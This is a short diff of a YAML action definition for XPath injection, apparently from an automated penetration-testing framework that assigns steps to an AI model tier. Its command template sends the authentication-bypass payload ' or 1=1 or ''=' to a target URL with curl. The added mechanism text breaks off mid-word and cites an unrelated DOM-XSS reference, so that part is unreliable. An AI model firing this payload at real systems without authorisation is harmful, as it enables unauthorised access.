@@ -2,15 +2,17 @@ name: xpath_injection
 category: web
 description: XPath injection exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}?user=' or 1=1 or ''='"
+command_template: curl -s '{target_url}?user=' or 1=1 or ''='
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "XPath injection in XML-based backends. Auth bypass: ' or 1=1 or ''='. Data extraction: substring(), string-length() for blind extraction."
+mechanism: 'From: [https://portswigger.net/web-security/dom-based/client-side-xpath-injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)
+  **DOM-based XPath-injection vulnerabilities** occur when a script incorporates **attacker-c'
+hacktricks_ref: pentesting-web/xss-cross-site-scripting/dom-xss.md
